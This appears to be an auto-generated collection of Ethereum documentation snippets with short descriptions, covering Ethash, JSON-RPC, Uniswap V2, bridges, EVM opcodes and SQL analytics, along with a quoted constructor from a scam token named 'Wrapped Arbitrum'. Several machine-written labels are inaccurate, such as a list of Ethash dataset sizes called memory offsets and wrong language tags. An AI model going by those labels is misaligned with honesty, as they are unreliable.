 \"0xb\", // 11\n]\n```\n\n----------------------------------------\n\nTITLE: Implementing Modified Hashimoto for Dagger-Hashimoto in Python\nDESCRIPTION: A modified version of Hashimoto that addresses the computational overhead issue by using only the least significant 64 bits when indexing the dataset. This implementation includes the full hashimoto function that operates on the DAG.\n\nLANGUAGE: python\nCODE:\n```\ndef hashimoto(dag, dagsize, params, header, nonce):\n    m = dagsize / 2\n    mix = sha3(encode_int(nonce) + header)\n    for _ in range(params[\"accesses\"]):\n        mix ^= dag[m + (mix % 2**64) % m]\n    return dbl_sha3(mix)\n```\n\n----------------------------------------\n\nTITLE: Displaying Ethereum Block Structure in JSON Format\nDESCRIPTION: An example JSON representation of an Ethereum block showing its structure including block number, hash, parent hash, miner address, and a transactions array. This illustrates the fundamental data structure of blocks in the Ethereum blockchain.\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"number\": 1234567,\n   \"hash\": \"0xabc123...\",\n   \"parentHash\": \"0xdef456...\",\n   \"miner\": \"0xa1b2c3...\",\n   ...,\n   \"transactions\": [...]\n}\n```\n\n----------------------------------------\n\nTITLE: Loading Calldata in Function 0x81e580d3\nDESCRIPTION: After calldata validation passes, this code loads the first word of calldata (after the function signature) to be used as an index for a lookup table.\n\nLANGUAGE: evm\nCODE:\n```\n1A0 | JUMPDEST            | 0x00 0x04 CALLDATASIZE 0x0153 0xDA       |\n1A1 | POP                 | 0x04 CALLDATASIZE 0x0153 0xDA            |\n1A2 | CALLDATALOAD        | calldataload(4) CALLDATASIZE 0x0153 0xDA |\n```\n\n----------------------------------------\n\nTITLE: Implementing Original Hashimoto Algorithm in Python\nDESCRIPTION: The original Hashimoto algorithm that uses the blockchain as a dataset. It selects indices from the blockchain, gathers transactions at those indices, performs XOR operations, and returns a hash of the result.\n\nLANGUAGE: python\nCODE:\n```\ndef orig_hashimoto(prev_hash, merkle_root, list_of_transactions, nonce):\n    hash_output_A = sha256(prev_hash + merkle_root + nonce)\n    txid_mix = 0\n    for i in range(64):\n        shifted_A = hash_output_A >> i\n        transaction = shifted_A % len(list_of_transactions)\n        txid_mix ^= list_of_transactions[transaction] << i\n    return txid_mix ^ (nonce << 192)\n```\n\n----------------------------------------\n\nTITLE: Reading Block Data and Sending Transactions with web3.py\nDESCRIPTION: Basic examples of using web3.py to read the latest block data and send a transaction on the Ethereum network.\n\nLANGUAGE: python\nCODE:\n```\n# read block data:\nw3.eth.get_block('latest')\n\n# send a transaction:\nw3.eth.send_transaction({'from': ..., 'to': ..., 'value': ...})\n```\n\n----------------------------------------\n\nTITLE: Testing Single Account Balance Change with changeBalance Matcher\nDESCRIPTION: Test that verifies if the split method correctly changes the balance of a specific receiver by the expected amount.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"Changes account balance\", async () => {\n  await expect(() => splitter.split({ value: 50 })).to.changeBalance(\n    receiver1,\n    25\n  )\n})\n```\n\n----------------------------------------\n\nTITLE: Retrieving Ethereum Accounts via JSON-RPC\nDESCRIPTION: Curl command that calls the eth_accounts method to get the list of available accounts from the Ethereum node.\n\nLANGUAGE: bash\nCODE:\n```\ncurl --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_accounts\",\"params\":[]\", \"id\":1}' -H \"Content-Type: application/json\" localhost:8545\n{\"id\":1,\"jsonrpc\":\"2.0\",\"result\":[\"0x9b1d35635cc34752ca54713bb99d38614f63c955\"]}\n```\n\n----------------------------------------\n\nTITLE: Checking Account Balance in Web3.py\nDESCRIPTION: Retrieves the balance of an Ethereum account in wei. This example gets the balance of the first account in the accounts list.\n\nLANGUAGE: python\nCODE:\n```\nw3.eth.get_balance(w3.eth.accounts[0])\n```\n\n----------------------------------------\n\nTITLE: Getting Filter Logs with eth_getFilterLogs\nDESCRIPTION: Example of retrieving all logs matching a filter with a specific ID. This method returns the same format as eth_getFilterChanges but includes all logs, not just new ones.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\n  \"0x16\", // 22\n]\n```\n\n----------------------------------------\n\nTITLE: Querying Gas Prices for Ethereum Foundation Transactions\nDESCRIPTION: SQL query that retrieves gas prices paid in transactions sent to the Ethereum Foundation's address. The query converts gas prices to Gwei and ETH values to a human-readable format, and orders results by block time.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    block_time,\n    gas_price / 1e9 AS gas_price_gwei,\n    value / 1e18 AS eth_sent\nFROM ethereum.\"transactions\"\nWHERE \"to\" = '\\xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe'\nORDER BY block_time DESC\n```\n\n----------------------------------------\n\nTITLE: Getting Filter Changes with eth_getFilterChanges\nDESCRIPTION: Example of polling for changes since the last request for a specific filter by providing the filter ID parameter.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\n  \"0x16\", // 22\n]\n```\n\n----------------------------------------\n\nTITLE: Instalando dotenv para Gerenciamento Seguro de Chaves\nDESCRIPTION: Comando para instalar o pacote dotenv via npm, utilizado para armazenar com segurança a chave de API da Alchemy e a chave privada Ethereum.\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install dotenv --save\n```\n\n----------------------------------------\n\nTITLE: Using Chakra UI Stack Layout Component\nDESCRIPTION: Shows how to use Chakra UI's Stack component for creating row-based layouts in React.\n\nLANGUAGE: tsx\nCODE:\n```\n<Stack direction='row'>\n```\n\n----------------------------------------\n\nTITLE: Checking Account Balances on Local Testnet\nDESCRIPTION: Hardhat command to check the balances of pre-funded accounts on the local testnet. This verifies that the Hardhat configuration is correctly connected to the local Ethereum network created by Kurtosis.\n\nLANGUAGE: python\nCODE:\n```\nnpx hardhat balances --network localnet\n```\n\n----------------------------------------\n\nTITLE: Configuring Selective Story Modes in Storybook for Component Testing\nDESCRIPTION: This code demonstrates how to selectively apply specific story modes rather than all combinations. It shows importing viewport and language-viewport modes and applying only specific ones like 'base' and 'ru-xl' for targeted testing.\n\nLANGUAGE: ts\nCODE:\n```\nimport { viewportModes, langViewportModes } from \"../../../../.storybook/modes\"\n\n// In the `meta` object\nparameters: {\n  chromatic: {\n    modes: {\n      base: viewportModes['base']\n      'ru-xl': langViewportModes['ru-xl']\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Lighthouse Consensus Client\nDESCRIPTION: Command to run the Lighthouse beacon node on Ethereum mainnet, configuring data directory, HTTP endpoint, and execution client connection details including the JWT authentication.\n\nLANGUAGE: sh\nCODE:\n```\nlighthouse beacon_node \\\n    --network mainnet \\\n    --datadir /data/ethereum \\\n    --http \\\n    --execution-endpoint http://127.0.0.1:8551 \\\n    --execution-jwt /path/to/jwtsecret\n```\n\n----------------------------------------\n\nTITLE: Running Lodestar Consensus Client\nDESCRIPTION: Command to start the Lodestar beacon node on Ethereum mainnet, specifying root directory, network settings, and execution client connection parameters including JWT authentication.\n\nLANGUAGE: sh\nCODE:\n```\nlodestar beacon \\\n    --rootDir=\"/data/ethereum\" \\\n    --network=mainnet \\\n    --eth1.enabled=true \\\n    --execution.urls=\"http://127.0.0.1:8551\" \\\n    --jwt-secret=\"/path/to/jwtsecret\"\n```\n\n----------------------------------------\n\nTITLE: Preventing Contract Deployment with 0xEF Prefix in London Upgrade\nDESCRIPTION: Reference to EIP-3541 implementation that prevents deploying new contracts that begin with the 0xEF byte pattern, providing forward compatibility for future upgrades.\n\nLANGUAGE: markdown\nCODE:\n```\ncode>0xEF</code>\n```\n\n----------------------------------------\n\nTITLE: Referencing the Entry Point Contract in Account Abstraction\nDESCRIPTION: This code snippet mentions the entry point contract that handles common wallet operations such as paying fees and executing EVM code, allowing wallet developers to focus on user experience.\n\nLANGUAGE: html\nCODE:\n```\n<a href=\"https://etherscan.io/address/0x0576a174D229E3cFA37253523E645A78A0C91B57\">Etherscan</a>\n```\n\n----------------------------------------\n\nTITLE: Final Function for Gas Price Calculation\nDESCRIPTION: The simplified function that calculates the required gas price (in gwei) to offset any amount of daily ETH issuance.\n\nLANGUAGE: markdown\nCODE:\n```\n- `f(X) = X/108` dove `X` è l'emissione giornaliera di ETH, e `f(X)` rappresenta il prezzo di gwei/gas necessario per compensare tutti i nuovi ETH emessi.\n```\n\n----------------------------------------\n\nTITLE: Setting Up ERC-20 Contract Parameters for Event Analysis\nDESCRIPTION: Defines the suspicious ERC-20 contract address and block range for event analysis. The narrow block range helps work within provider limits for event retrieval.\n\nLANGUAGE: typescript\nCODE:\n```\nconst testedAddress = \"0xb047c8032b99841713b8e3872f06cf32beb27b82\"\nconst fromBlock = 16859812n\nconst toBlock = 16873372n\n```\n\n----------------------------------------\n\nTITLE: Displaying Energy Consumption Comparison Chart in HTML\nDESCRIPTION: An HTML component that renders a chart comparing Ethereum's energy consumption with other products and industries. The chart visually demonstrates how Ethereum's consumption is drastically lower than other digital services.\n\nLANGUAGE: html\nCODE:\n```\n<EnergyConsumptionChart />\n```\n\n----------------------------------------\n\nTITLE: Eth1 Definition in Ethereum Terminology\nDESCRIPTION: Definition of 'Eth1' term which previously referred to Mainnet Ethereum and the proof-of-work blockchain, now deprecated in favor of 'execution layer'.\n\nLANGUAGE: markdown\nCODE:\n```\n'Eth1' is a term that referred to Mainnet Ethereum, the existing proof-of-work blockchain. This term has since been deprecated in favor of the 'execution layer'. [Learn more about this name change](https://blog.ethereum.org/2022/01/24/the-great-eth2-renaming/).\n```\n\n----------------------------------------\n\nTITLE: Comparing Weak vs Strong Password Examples in Markdown\nDESCRIPTION: Example demonstration of weak and strong password patterns. The weak password uses common words that are vulnerable to dictionary attacks, while the strong password contains a random mixture of characters, symbols and numbers.\n\nLANGUAGE: markdown\nCODE:\n```\nExample of a weak password: CuteFluffyKittens!\n\nExample of a strong password: ymv\\*azu.EAC8eyp8umf\n```\n\n----------------------------------------\n\nTITLE: Importing StakingLaunchpadWidget Component in React\nDESCRIPTION: A React component that displays the Ethereum staking launchpad widget to help users begin the home staking process. This widget guides users through validator setup, key generation, and ETH deposits.\n\nLANGUAGE: jsx\nCODE:\n```\n<StakingLaunchpadWidget />\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies with Yarn\nDESCRIPTION: Command to install project dependencies using Yarn package manager. This is required before starting local development.\n\nLANGUAGE: shell\nCODE:\n```\nyarn\n```\n\n----------------------------------------\n\nTITLE: Inefficient Constructor Implementation in Scam ERC-20 Token\nDESCRIPTION: This constructor sets up the token's basic properties and mints the initial supply in an inefficient way, calling the mount function five times instead of once. The token is deceptively named 'Wrapped Arbitrum' to appear legitimate.\n\nLANGUAGE: solidity\nCODE:\n```\nconstructor () public {\n\n    _name = \"Wrapped Arbitrum\";\n    _symbol = \"wARB\";\n    _decimals = 18;\n    uint256 initialSupply = 1000000000000;\n\n    mount(deployer, initialSupply*(10**18)/5);\n    mount(deployer, initialSupply*(10**18)/5);\n    mount(deployer, initialSupply*(10**18)/5);\n    mount(deployer, initialSupply*(10**18)/5);\n    mount(deployer, initialSupply*(10**18)/5);\n}\n```\n\n----------------------------------------\n\nTITLE: Consultando el saldo de tokens con balanceOf\nDESCRIPTION: Ejemplo de cómo llamar a la función balanceOf del contrato DAI para obtener el saldo de tokens de una dirección específica. Esta es una operación de solo lectura que no modifica el estado de la blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\ndaiToken.methods.balanceOf(senderAddress).call(function (err, res) {\n  if (err) {\n    console.log(\"An error occurred\", err)\n    return\n  }\n  console.log(\"The balance is: \", res)\n})\n```\n\n----------------------------------------\n\nTITLE: Implementing supportsInterface Function for ERC-165\nDESCRIPTION: A view function that implements the ERC-165 standard, allowing other contracts to query which interfaces this contract supports. It returns a boolean indicating whether the specified interface ID is supported.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef supportsInterface(_interfaceID: bytes32) -> bool:\n    \"\"\"\n    @dev Interface identification is specified in ERC-165.\n    @param _interfaceID Id of the interface\n    \"\"\"\n    return self.supportedInterfaces[_interfaceID]\n```\n\n----------------------------------------\n\nTITLE: Creating a Spreadsheet Function for Calculating Opcode Sizes in EVM\nDESCRIPTION: This Google Sheets formula calculates the size in bytes of each opcode by adding 1 for the opcode itself plus the number of bytes required for PUSH operations.\n\nLANGUAGE: googlesheets\nCODE:\n```\n=1+IF(REGEXMATCH(C1,\"PUSH\"),REGEXEXTRACT(C1,\"PUSH(\\d+)\"),0)\n```\n\n----------------------------------------\n\nTITLE: Calldata Value Extraction Function (Solidity)\nDESCRIPTION: Private helper function that extracts a value from calldata at a specific position and with a specific length, including validation checks.\n\nLANGUAGE: solidity\nCODE:\n```\n    function calldataVal(uint startByte, uint length)\n        private pure returns (uint) {\n        uint _retVal;\n\n        require(length < 0x21,\n            \"calldataVal length limit is 32 bytes\");\n\n        require(length + startByte <= msg.data.length,\n            \"calldataVal trying to read beyond calldatasize\");\n\n        assembly {\n            _retVal := calldataload(startByte)\n        }\n\n        _retVal = _retVal >> (256-length*8);\n\n        return _retVal;\n    }\n```\n\n----------------------------------------\n\nTITLE: Analyzing Daily Gas Usage on Ethereum\nDESCRIPTION: This SQL query calculates the average amount of gas actually used per block for each day. This represents the demand for block space on the Ethereum blockchain.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    AVG(gas_used) AS avg_block_gas_used\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n```\n\n----------------------------------------\n\nTITLE: Querying Ethereum Foundation Gas Prices and Transactions\nDESCRIPTION: SQL query that retrieves gas prices and transaction values for transactions sent to the Ethereum Foundation's address. The query converts gas prices to Gwei and ETH values to a more readable format.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    block_time,\n    gas_price / 1e9 AS gas_price_gwei,\n    value / 1e18 AS eth_sent\nFROM ethereum.\"transactions\"\nWHERE \"to\" = '\\xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe'\nORDER BY block_time DESC\n```\n\n----------------------------------------\n\nTITLE: LOG Operations in Ethereum EVM (LOG0-LOG4)\nDESCRIPTION: LOG operations append log records to the transaction receipt logs. They consume memory offset and length from the stack, plus a varying number of topics (0-4) depending on the operation. These operations clear the stack items and have dynamic gas costs.\n\nLANGUAGE: opcodes\nCODE:\n```\nA0   LOG0    // LOG0(memory[ost:ost+len-1])\n                // Stack input: ost, len\n                // Stack output: .\nA1   LOG1    // LOG1(memory[ost:ost+len-1], topic0)\n                // Stack input: ost, len, topic0\n                // Stack output: .\nA2   LOG2    // LOG2(memory[ost:ost+len-1], topic0, topic1)\n                // Stack input: ost, len, topic0, topic1\n                // Stack output: .\nA3   LOG3    // LOG3(memory[ost:ost+len-1], topic0, topic1, topic2)\n                // Stack input: ost, len, topic0, topic1, topic2\n                // Stack output: .\nA4   LOG4    // LOG4(memory[ost:ost+len-1], topic0, topic1, topic2, topic3)\n                // Stack input: ost, len, topic0, topic1, topic2, topic3\n                // Stack output: .\n```\n\n----------------------------------------\n\nTITLE: Retrieving the latest block number using async/await pattern\nDESCRIPTION: Shows how to use the modern async/await syntax to retrieve the latest block number from the Ethereum blockchain, avoiding callback nesting.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function getBlockNumber() {\n  const latestBlockNumber = await web3.eth.getBlockNumber()\n  console.log(latestBlockNumber)\n  return latestBlockNumber\n}\n\ngetBlockNumber()\n```\n\n----------------------------------------\n\nTITLE: Removing Liquidity for ETH Pairs with Fee-on-Transfer Token Support in Uniswap V2\nDESCRIPTION: Function to remove liquidity for token-ETH pairs where the token has transfer fees. Instead of using the returned token amount, it transfers the entire balance of tokens that the router has received.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountETH) {\n    (, amountETH) = removeLiquidity(\n        token,\n        WETH,\n        liquidity,\n        amountTokenMin,\n        amountETHMin,\n        address(this),\n        deadline\n    );\n    TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));\n    IWETH(WETH).withdraw(amountETH);\n    TransferHelper.safeTransferETH(to, amountETH);\n}\n```\n\n----------------------------------------\n\nTITLE: Sample Output of Test Execution\nDESCRIPTION: Example output showing successful test execution of the ChipToken minting functionality. The test verifies that the contract correctly mints 1000 chips for a player in the Blackjack dApp.\n\nLANGUAGE: python\nCODE:\n```\nChipToken\n    mint\n      ✔ should mint 1000 chips for PLAYER ONE\n\n  1 passing (654ms)\n```\n\n----------------------------------------\n\nTITLE: Implementing Cache-Based DAG Evaluation Algorithm in Python for Ethereum\nDESCRIPTION: This code implements an efficient cache-based evaluation algorithm for Ethereum's DAG. It includes functions for quick calculation using a cached DAG and a quick Hashimoto implementation that leverages the cache to perform mining operations more efficiently. The algorithm uses modular exponentiation with carefully selected parameters to ensure security properties.\n\nLANGUAGE: python\nCODE:\n```\ndef quick_calc(params, seed, p):\n    cache = produce_dag(params, seed, params[\"cache_size\"])\n    return quick_calc_cached(cache, params, p)\n\ndef quick_calc_cached(cache, params, p):\n    P = params[\"P\"]\n    if p < len(cache):\n        return cache[p]\n    else:\n        x = pow(cache[0], p + 1, P)\n        for _ in range(params[\"k\"]):\n            x ^= quick_calc_cached(cache, params, x % p)\n        return pow(x, params[\"w\"], P)\n\ndef quick_hashimoto(seed, dagsize, params, header, nonce):\n    cache = produce_dag(params, seed, params[\"cache_size\"])\n    return quick_hashimoto_cached(cache, dagsize, params, header, nonce)\n\ndef quick_hashimoto_cached(cache, dagsize, params, header, nonce):\n    m = dagsize // 2\n    mask = 2**64 - 1\n    mix = sha3(encode_int(nonce) + header)\n    for _ in range(params[\"accesses\"]):\n        mix ^= quick_calc_cached(cache, params, m + (mix & mask) % m)\n    return dbl_sha3(mix)\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Name Registration System in Ethereum\nDESCRIPTION: A simple Ethereum smart contract that implements a Namecoin-like registration system where users can register a name with a value. Once registered, the name-value pair cannot be modified or deleted, creating a permanent record on the blockchain.\n\nLANGUAGE: python\nCODE:\n```\ndef register(name, value):\n  if !self.storage[name]:\n    self.storage[name] = value\n```\n\n----------------------------------------\n\nTITLE: Setting Operator Approval for NFT Transfers in Solidity\nDESCRIPTION: This function allows an owner to grant or revoke permission for an operator to transfer all of their tokens. It requires the operator address to be different from the sender and emits an ApprovalForAll event upon completion.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction setApprovalForAll(address to, bool approved) public {\n    require(to != msg.sender, \"Cannot approve own address\");\n    operatorApprovals[msg.sender][to] = approved;\n    emit ApprovalForAll(msg.sender, to, approved);\n}\n```\n\n----------------------------------------\n\nTITLE: L2 Bridge Deposit Security Check in Solidity\nDESCRIPTION: Security check that ensures the message source is the L1 bridge. This prevents unauthorized minting of tokens on L2 that aren't backed by deposits on L1.\n\nLANGUAGE: solidity\nCODE:\n```\n    ) external virtual onlyFromCrossDomainAccount(l1TokenBridge) {\n```\n\n----------------------------------------\n\nTITLE: Creating Environment Configuration for Ethereum Transaction Security\nDESCRIPTION: Example content for a .env file that securely stores the Alchemy API URL and the private key required for signing Ethereum transactions.\n\nLANGUAGE: JavaScript\nCODE:\n```\nAPI_URL = \"your-api-url\"\nPRIVATE_KEY = \"your-private-key\"\n```\n\n----------------------------------------\n\nTITLE: Calculating Cache and Dataset Sizes in Ethash\nDESCRIPTION: Functions to determine the cache and dataset sizes for a given block number in the Ethash algorithm. The sizes grow linearly with epochs but are adjusted to the nearest prime to prevent cyclic behavior.\n\nLANGUAGE: python\nCODE:\n```\ndef get_cache_size(block_number):\n    sz = CACHE_BYTES_INIT + CACHE_BYTES_GROWTH * (block_number // EPOCH_LENGTH)\n    sz -= HASH_BYTES\n    while not isprime(sz / HASH_BYTES):\n        sz -= 2 * HASH_BYTES\n    return sz\n\ndef get_full_size(block_number):\n    sz = DATASET_BYTES_INIT + DATASET_BYTES_GROWTH * (block_number // EPOCH_LENGTH)\n    sz -= MIX_BYTES\n    while not isprime(sz / MIX_BYTES):\n        sz -= 2 * MIX_BYTES\n    return sz\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Bytecode Implementation\nDESCRIPTION: Compiled bytecode representation of an ERC20 token contract. The bytecode includes error messages for various ERC20 operations like transfers to zero addresses, insufficient balances, and allowance operations.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122081c840f087cef92feccb03fadc678b2708c331896ec5432b5d4c675f27b6d3e664736f6c63430006020033\n```\n\n----------------------------------------\n\nTITLE: Finalizing ETH Withdrawal from L2 to L1 in Solidity\nDESCRIPTION: This function processes ETH withdrawals coming from L2. It can only be called by the cross-domain messenger with a message originating from the L2 token bridge. It transfers ETH to the recipient and emits an event to notify listeners.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction finalizeETHWithdrawal(\n    address _from,\n    address _to,\n    uint256 _amount,\n    bytes calldata _data\n) external onlyFromCrossDomainAccount(l2TokenBridge) {\n    // slither-disable-next-line reentrancy-events\n    (bool success, ) = _to.call{ value: _amount }(new bytes(0));\n    require(success, \"TransferHelper::safeTransferETH: ETH transfer failed\");\n\n    // slither-disable-next-line reentrancy-events\n    emit ETHWithdrawalFinalized(_from, _to, _amount, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Running Echidna on the Magic Values Contract\nDESCRIPTION: Command showing Echidna unable to find the magic values that would trigger the state change in the contract, resulting in a passing test.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test magic.sol\n...\n\nechidna_magic_values: passed! 🎉\n\nSeed: 2221503356319272685\n```\n\n----------------------------------------\n\nTITLE: Implementing ExpandableCard Component for Non-Validating Node Operators\nDESCRIPTION: A React/JSX expandable card component explaining changes for non-validating node operators after The Merge, highlighting the need to run both execution and consensus layer clients and configure proper authentication between them.\n\nLANGUAGE: jsx\nCODE:\n```\n<ExpandableCard\ntitle=\"Non-validating node operators and infrastructure providers\"\ncontentPreview=\"If you're operating a non-validating Ethereum node, the most significant change that came with The Merge was the requirement to run clients for BOTH the execution layer AND the consensus layer.\"\nid=\"node-operators\">\n\nUp until The Merge, an execution client (such as Geth, Erigon, Besu or Nethermind) was enough to receive, properly validate, and propagate blocks being gossiped by the network. _After The Merge_, the validity of transactions contained within an execution payload now also depends on the validity of the \"consensus block\" it is contained within.\n\nAs a result, a full Ethereum node now requires both an execution client and a consensus client. These two clients work together using a new Engine API. The Engine API requires authentication using a JWT secret, which is provided to both clients allowing secure communication.\n\nKey action items include:\n\n- Install a consensus client in addition to an execution client\n- Authenticate execution and consensus clients with a shared JWT secret so they can securely communicate with one another.\n\nNot completing the above items will result in your node appearing to be \"offline\" until both layers are synced and authenticated.\n\n</ExpandableCard>\n```\n\n----------------------------------------\n\nTITLE: SAR Opcode (Arithmetic Shift Right) in EVM\nDESCRIPTION: The SAR opcode performs an arithmetic right shift operation. It takes a shift amount and a value from the stack, and returns the result of shifting the value right by the specified number of bits, preserving the sign bit.\n\nLANGUAGE: evm-assembly\nCODE:\n```\nval >> shift\n```\n\n----------------------------------------\n\nTITLE: Additional Token and Pair Validation in Uniswap V2 Factory\nDESCRIPTION: Additional validation checks to ensure token0 is not the zero address and that a pair for these tokens doesn't already exist. This prevents multiple pools for the same token pair.\n\nLANGUAGE: solidity\nCODE:\n```\n        require(token0 != address(0), 'UniswapV2: ZERO_ADDRESS');\n        require(getPair[token0][token1] == address(0), 'UniswapV2: PAIR_EXISTS'); // single check is sufficient\n```\n\n----------------------------------------\n\nTITLE: Analyzing Daily Ethereum Block Production with SQL\nDESCRIPTION: This query aggregates Ethereum blocks by day since 2016, counting how many blocks were produced each day. The OFFSET 1 is used to skip the first day which might contain partial data.\n\nLANGUAGE: sql\nCODE:\n```\n# query to visualize number of blocks produced daily since 2016\n\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    COUNT(*) AS block_count\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n\n# average number of blocks produced per day\n\nWITH temp_table AS (\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    COUNT(*) AS block_count\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n)\nSELECT\n    AVG(block_count) AS avg_block_count\nFROM temp_table\n```\n\n----------------------------------------\n\nTITLE: JSON-RPC Request for eth_getLogs\nDESCRIPTION: Example of a request to get logs directly with a filter object that specifies topic criteria. The response format is the same as for eth_getFilterChanges.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getLogs\",\"params\":[{\"topics\":[\"0x000000000000000000000000a94f5374fce5edbc8e2a8697c15331677e6ebf0b\"]}],\"id\":74}'\n```\n\n----------------------------------------\n\nTITLE: Creating Project Directory for Ethereum Development\nDESCRIPTION: Shell commands to create and navigate to a new project directory called 'hello-world' for the smart contract development.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir hello-world\ncd hello-world\n```\n\n----------------------------------------\n\nTITLE: Protocol Fee Calculation Logic in Uniswap V2 (Solidity)\nDESCRIPTION: This code begins the protocol fee calculation, which creates new liquidity tokens for the protocol fee recipient. Protocol fees are only calculated when liquidity changes and only if both fees are enabled and kLast is non-zero.\n\nLANGUAGE: solidity\nCODE:\n```\n        if (feeOn) {\n            if (_kLast != 0) {\n```\n\n----------------------------------------\n\nTITLE: Proxy Preparation for Delegate Call in EVM Smart Contract\nDESCRIPTION: This code prepares memory for the delegate call by copying the calldata to memory at position 0x80. This ensures that the implementation contract receives the exact same calldata as the proxy.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n9D | JUMPDEST   | Storage[3]-as-address 0x00      \n9E | SWAP1      | 0x00 Storage[3]-as-address      \n9F | POP        | Storage[3]-as-address           \nA0 | PUSH1 0x40 | 0x40 Storage[3]-as-address      \nA2 | MLOAD      | Mem[0x40] Storage[3]-as-address\n```\n\n----------------------------------------\n\nTITLE: Listing Memory Offset Values in Plaintext\nDESCRIPTION: A comprehensive list of memory offset values, possibly used for memory allocation, addressing, or boundary tracking in Ethereum's implementation. The values follow a generally increasing pattern with various step sizes.\n\nLANGUAGE: plaintext\nCODE:\n```\n190577984, 190709312, 190840768, 190971328, 191102656, 191233472,\n191364032, 191495872, 191626816, 191758016, 191888192, 192020288,\n192148928, 192282176, 192413504, 192542528, 192674752, 192805952,\n192937792, 193068608, 193198912, 193330496, 193462208, 193592384,\n193723456, 193854272, 193985984, 194116672, 194247232, 194379712,\n194508352, 194641856, 194772544, 194900672, 195035072, 195166016,\n195296704, 195428032, 195558592, 195690304, 195818176, 195952576,\n196083392, 196214336, 196345792, 196476736, 196607552, 196739008,\n196869952, 197000768, 197130688, 197262784, 197394368, 197523904,\n197656384, 197787584, 197916608, 198049472, 198180544, 198310208,\n198442432, 198573632, 198705088, 198834368, 198967232, 199097792,\n199228352, 199360192, 199491392, 199621696, 199751744, 199883968,\n200014016, 200146624, 200276672, 200408128, 200540096, 200671168,\n200801984, 200933312, 201062464, 201194944, 201326144, 201457472,\n201588544, 201719744, 201850816, 201981632, 202111552, 202244032,\n202374464, 202505152, 202636352, 202767808, 202898368, 203030336,\n203159872, 203292608, 203423296, 203553472, 203685824, 203816896,\n203947712, 204078272, 204208192, 204341056, 204472256, 204603328,\n204733888, 204864448, 204996544, 205125568, 205258304, 205388864,\n205517632, 205650112, 205782208, 205913536, 206044736, 206176192,\n206307008, 206434496, 206569024, 206700224, 206831168, 206961856,\n207093056, 207223616, 207355328, 207486784, 207616832, 207749056,\n207879104, 208010048, 208141888, 208273216, 208404032, 208534336,\n208666048, 208796864, 208927424, 209059264, 209189824, 209321792,\n209451584, 209582656, 209715136, 209845568, 209976896, 210106432,\n210239296, 210370112, 210501568, 210630976, 210763712, 210894272,\n211024832, 211156672, 211287616, 211418176, 211549376, 211679296,\n211812032, 211942592, 212074432, 212204864, 212334016, 212467648,\n212597824, 212727616, 212860352, 212991424, 213120832, 213253952,\n213385024, 213515584, 213645632, 213777728, 213909184, 214040128,\n214170688, 214302656, 214433728, 214564544, 214695232, 214826048,\n214956992, 215089088, 215219776, 215350592, 215482304, 215613248,\n215743552, 215874752, 216005312, 216137024, 216267328, 216399296,\n216530752, 216661696, 216790592, 216923968, 217054528, 217183168,\n217316672, 217448128, 217579072, 217709504, 217838912, 217972672,\n218102848, 218233024, 218364736, 218496832, 218627776, 218759104,\n218888896, 219021248, 219151936, 219281728, 219413056, 219545024,\n219675968, 219807296, 219938624, 220069312, 220200128, 220331456,\n220461632, 220592704, 220725184, 220855744, 220987072, 221117888,\n221249216, 221378368, 221510336, 221642048, 221772736, 221904832,\n222031808, 222166976, 222297536, 222428992, 222559936, 222690368,\n222820672, 222953152, 223083968, 223213376, 223345984, 223476928,\n223608512, 223738688, 223869376, 224001472, 224132672, 224262848,\n224394944, 224524864, 224657344, 224788288, 224919488, 225050432,\n225181504, 225312704, 225443776, 225574592, 225704768, 225834176,\n225966784, 226097216, 226229824, 226360384, 226491712, 226623424,\n226754368, 226885312, 227015104, 227147456, 227278528, 227409472,\n227539904, 227669696, 227802944, 227932352, 228065216, 228196288,\n228326464, 228457792, 228588736, 228720064, 228850112, 228981056,\n229113152, 229243328, 229375936, 229505344, 229636928, 